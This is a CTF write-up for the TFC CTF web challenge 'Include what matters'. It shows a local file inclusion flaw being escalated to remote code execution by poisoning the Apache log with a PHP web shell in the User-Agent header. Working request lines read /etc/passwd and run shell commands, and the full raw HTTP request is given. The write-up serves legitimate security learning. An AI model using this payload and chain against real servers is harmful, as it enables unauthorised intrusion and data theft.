# TFC CTF

## WEB

### INCLUDE WHAT MATTERS.

**Difficulty:** Medium

**Statement:** Flag Format : TFCCTF{}
The flag file has a random name and it's in a random location .

***

On the website, we quickly detect an LFI flaw with the include logs:

![image](https://user-images.githubusercontent.com/49941629/182035020-b3665a6b-6605-443d-9a3d-aa965f8073d3.png)

In order to confirm the flaw, I will get the `/etc/passwd` file : `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/etc/passwd`

![image](https://user-images.githubusercontent.com/49941629/182035123-5de0a972-4134-4cf0-b90b-4bf17fcb28c0.png)

Now I'm looking to see if we have access to the web server log files to perform a log poisoning attack.

I see that we can read the contents of the file `/var/log/apache2/access.log` : `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log`

So I will modify my HTTP request to add the PHP payload `<?php system($_GET['cmd']); ?>` in the user agent:

```
GET /?file=/var/log/apache2/access.log HTTP/1.1
Host: 01.linux.challenges.ctf.thefewchosen.com:49412
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

Now, I just have to add `&cmd=` as a parameter to my query in order to perform RCE: `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=id`

```
[30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 uid=33(www-data) gid=33(www-data) groups=33(www-data) Safari/537.36"
```

I list the contents of the `/` directory: `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=ls%20/`

`[30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 bin boot dev etc hidden_fl4g.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var Safari/537.36"`

I get the content of the flag : `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=cat%20/hidden_fl4g.txt`

`30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3} Safari/537.36"`

Flag: `TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3}`
